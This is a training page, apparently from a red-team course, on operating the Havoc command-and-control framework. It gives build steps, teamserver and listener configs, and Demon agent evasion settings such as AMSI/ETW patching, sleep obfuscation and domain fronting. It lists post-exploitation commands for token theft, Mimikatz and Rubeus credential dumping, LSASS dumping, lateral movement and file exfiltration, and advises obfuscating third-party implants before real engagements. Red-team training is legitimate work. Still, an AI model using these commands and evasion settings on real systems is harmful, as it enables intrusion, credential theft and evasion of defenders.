---
layout: training-page
title: "Havoc C2 — Red Team Academy"
module: "C2 Frameworks"
tags:
  - havoc
  - c2
  - demon
  - teamserver
  - edr-bypass
page_key: "c2-havoc"
render_with_liquid: false
---

# Havoc C2 Framework

Havoc is a modern, open-source C2 framework designed with evasion as a first-class feature. The "Demon" agent supports indirect syscalls, sleep obfuscation (Ekko), stack spoofing, and SMB/TCP peer-to-peer pivoting. Written in Go (teamserver) and C (Demon agent), Havoc offers a Qt-based GUI similar to Cobalt Strike.

## Installation & Setup

```
# Install dependencies:
sudo apt install -y git build-essential apt-utils cmake libfontconfig1 \
  libglu1-mesa-dev libgtest-dev libspdlog-dev libboost-all-dev \
  libncurses5-dev libgdbm-dev libssl-dev libreadline-dev libffi-dev \
  libsqlite3-dev libbz2-dev mesa-common-dev qtbase5-dev \
  qtchooser qt5-qmake qtbase5-dev-tools libqt5websockets5 \
  libqt5websockets5-dev qtdeclarative5-dev golang-go nasm mingw-w64

# Clone and build:
git clone https://github.com/HavocFramework/Havoc
cd Havoc

# Build teamserver:
cd teamserver
go mod download
go build -o havoc . && mv havoc ..

# Build client (requires Qt5):
cd ../client
cmake -S . -B build
cmake --build build
mv build/Havoc ..

# Alternatively use Docker:
docker pull ghcr.io/havocframework/havoc:main
```

## Teamserver Configuration

```
# havoc.yaotl — teamserver profile config:
# Default location: profiles/havoc.yaotl

Teamserver {
    Host = "0.0.0.0"
    Port = 40056
    Build {
        Compiler64 = "/usr/bin/x86_64-w64-mingw32-gcc"
        Nasm = "/usr/bin/nasm"
    }
}

Operators {
    user "operator1" {
        Password = "password123"
    }
}

Listeners {
    Http {
        Name = "http_80"
        Hosts = ["192.168.1.100"]
        Port = 80
        Secure = false
        Uris = ["/jquery-3.3.1.min.js", "/api/v1/data"]
        Headers {
            "User-Agent" = "Mozilla/5.0"
            "Content-Type" = "application/json"
        }
    }
}

# Start teamserver:
./havoc server --profile profiles/havoc.yaotl

# Connect client:
./Havoc
```

## Demon Agent Configuration

```
# Demon is the Havoc C2 agent
# Configure in the GUI: Payloads → Generate → Demon

# Key evasion settings:
# Sleep Technique: WaitForSingleObjectEx, Ekko, or Foliage
# Sleep Obfuscation: XOR or RC4 key
# Indirect Syscalls: enabled
# Stack Spoof: enabled
# Injection: NtQueueApcThreadEx or ClassicShellcode

# Demon features:
# - Indirect syscalls (SysWhispers3 integration)
# - Sleep obfuscation (Ekko default, Foliage option)
# - Stack spoofing during sleep
# - SMB named pipe P2P pivoting
# - TCP P2P pivoting
# - Token manipulation (impersonation, steal)
# - SOCKS5 proxy
# - Port forwarding

# Generate payload via CLI:
./havoc generate --profile demon.json --output demon.bin
```

## Post-Exploitation Commands

```
# In the Havoc console (agent tab):

# Situational awareness:
shell whoami /all
shell hostname
shell ipconfig /all
shell net localgroup administrators
dotnet inline-execute Seatbelt.exe AntiVirus

# Process listing:
proc list

# Token operations:
token steal 1234       # steal token from PID 1234
token impersonate      # impersonate stolen token
token revert           # revert to original token

# Credential access:
dotnet inline-execute Rubeus.exe dump /nowrap
dotnet inline-execute Mimikatz.exe "sekurlsa::logonpasswords" "exit"

# Lateral movement:
jump psexec TARGET_IP SERVICE_NAME
jump wmi TARGET_IP
jump winrm TARGET_IP

# Pivoting:
pivot smb TARGET_IP PIPE_NAME    # SMB pivot
rportfwd 8080 127.0.0.1 80       # reverse port forward
socks 1080                        # SOCKS5 proxy

# File operations:
upload /local/file.exe C:\Windows\Temp\file.exe
download C:\Users\Admin\secret.txt
```

## BOF (Beacon Object File) Support

```
# Havoc supports Cobalt Strike-compatible BOFs
# BOFs: compiled C object files executed in agent memory

# Loading BOFs in Havoc:
# Interact tab → BOF → Select BOF file
# Or from console:
inline-execute /path/to/bof.obj arg1 arg2

# Popular BOFs compatible with Havoc:
# TrustedSec BOF Collection:
git clone https://github.com/trustedsec/CS-Situational-Awareness-BOF

# Build a BOF:
x86_64-w64-mingw32-gcc -o bof.obj -c bof.c \
  -masm=intel -Wall -Wno-unused-variable

# Common useful BOFs:
# whoami — token/privilege info
# enumLocalAdmins — enumerate admin group
# netGroupList — domain group listing
# kerberoast — Kerberoasting from BOF (no Rubeus needed)
# nanodump — LSASS dump via BOF
```

## Evasion Features Deep Dive

```
# Havoc Demon evasion configuration (in agent build dialog):

# 1. Indirect Syscalls:
#    Uses SysWhispers3 — dynamically resolves SSNs
#    All NTAPI calls go through indirect syscall stubs

# 2. Sleep Obfuscation (Ekko):
#    Encrypts .text section of Demon during sleep
#    Uses RC4 via SystemFunction032
#    VirtualProtect RW → encrypt → sleep → decrypt → RX

# 3. Stack Spoofing:
#    During NtWaitForSingleObject (sleep), stack shows ntdll frames
#    Implemented via timer queue gadgets

# 4. AMSI/ETW Bypass:
#    Patches AmsiScanBuffer and EtwEventWrite at startup
#    Via indirect syscalls to avoid VirtualProtect EDR hooks

# HTTPS listener with domain fronting:
Listeners {
    Http {
        Name = "https_fronted"
        Hosts = ["cdn.cloudflare.com"]  # fronted domain
        HostBind = "0.0.0.0"
        Port = 443
        Secure = true
        Headers {
            "Host" = "cdn.cloudflare.com"
        }
    }
}
```

## Third-Party Agents

Havoc exposes a **service API** that lets you register external implants alongside the built-in Demon. This is how red teamers ship custom agents in foreign runtimes (C, Rust, .NET, Python) while still using Havoc's operator UI, task queueing, and file transfer. External agents communicate with the teamserver via WebSocket and register callback / task / register handlers.

> **Havoc 0.6 removed the third-party agent API.** Keep a Havoc 0.5 or `dev` branch teamserver for compatibility with the agents below.

| Agent | Language | Repo | Use case |
|-------|----------|------|----------|
| **Talon** | C + Python shim | `HavocFramework/Talon` | Canonical minimal demo — read this first |
| **Revenant** | C (Talon-derived) | `0xTriboulet/Revenant` | Polymorphism, string obfuscation, sleep obfuscation, x86/x64 builds |
| **SharpAgent** | C# (.NET Framework) | `susMdT/SharpAgent` | BOF execution, inline PE, PowerShell import/run from a .NET implant |
| **PyHmmm** | Python | `CodeXTF2/PyHmmm` | Educational Python POC — two commands (`shell`, `exit`) |

### Talon — the reference implementation

Talon is the "hello world" for Havoc 3rd-party agents — a C implant plus a Python bridge that speaks to the teamserver's service API. Read this before building your own.

```
# Typical layout:
#   Talon.c      - agent source (C, 69% of the repo)
#   Talon.py     - service-API bridge (register, callback, task, response)
#   Makefile     - cross-compile to PE via mingw-w64

# Build + run:
git clone https://github.com/HavocFramework/Talon
cd Talon
make                                     # produces Talon.exe
python3 Talon.py                         # registers the agent type with teamserver
# Then in the Havoc client: Attack → Payload → select "Talon" → generate
```

`Talon.py` is the template for how any third-party agent registers: it connects to the WebSocket, calls `register`, then implements `callback` (incoming check-ins) and `task` (operator-issued jobs).

### Revenant — hardened Talon fork

```
# Build prerequisites:
pip install black
# In Havoc client:
unzip Revenant.zip
python3 Revenant.py        # registers agent type

# Build-time configuration (via Havoc payload builder):
#   - sleep           polymorphic sleep interval
#   - string-obf      compile-time string obfuscation
#   - rand-cmd-ids    randomize CmdIDs per-build (single-session only)
#   - anti-debug      timing + IsDebuggerPresent checks
#   - arch            x86 / x64
```

Supported commands: `pwsh`, `shell`, `upload`, `download`, `exit`. Roadmap includes `.NET assembly execution`, standard shell built-ins (`cd`/`ls`/`whoami`), and entropy reduction.

### SharpAgent — C# BOF/PE-capable agent

```
# Clone, open in Visual Studio, change handler in source to teamserver IP:
# SharpAgent/Agent/Program.cs → modify handler address/port
# Release | Any CPU → build

# 13 supported commands include:
#   exit, ls, shell, upload, download,
#   bofexec, inline_assembly, inline_pe,
#   powershell, powershell_import, powershell_list, powershell_free
```

OPSEC caveats baked into SharpAgent by default:

- Assembly name is `HavocImplant`, no obfuscation → flagged by name/strings immediately
- PowerShell scripts stored in **plaintext** in the implant's memory → LSASS-adjacent dumps will recover them
- Author explicitly discourages production use — treat SharpAgent as a read-and-customize starting point

### PyHmmm — minimum viable Python agent

```
git clone https://github.com/CodeXTF2/PyHmmm
cd PyHmmm
sudo pip install -r requirements.txt

# Edit agent.py to set teamserver IP / port
python3 handler.py     # registers the agent type
python3 agent.py       # launches a single instance
```

Only two commands: `shell <cmd>` and `exit`. Useful to read if you want to understand the absolute minimum your own Havoc agent needs to do.

### Detection / OPSEC Notes for 3rd-Party Agents

- All of the above talk to Havoc over the **operator port**, not the implant ports — your infrastructure decisions for Demon still apply to the listener side, but operator traffic is a local development concern.
- Third-party agents are typically **single-use templates** — do not ship Talon or PyHmmm unchanged. Rename, obfuscate strings, replace the sleep/callback primitive, and re-sign before any real engagement.
- Even hardened variants like Revenant lack Demon's evasion suite (indirect syscalls, Ekko sleep obfuscation, return-address spoofing). Use third-party agents to practice development, not to replace Demon in real ops.

## Resources

- Havoc — `github.com/HavocFramework/Havoc`
- Havoc Documentation — `havocframework.com/docs`
- C2 Matrix — `howto.bearspace.net/c2/comparison`
- Demon agent source — `github.com/HavocFramework/Havoc/tree/main/payloads/Demon`
- Talon (demo agent) — `github.com/HavocFramework/Talon`
- Revenant (hardened C agent) — `github.com/0xTriboulet/Revenant`
- SharpAgent (C# agent) — `github.com/susMdT/SharpAgent`
- PyHmmm (Python agent) — `github.com/CodeXTF2/PyHmmm`
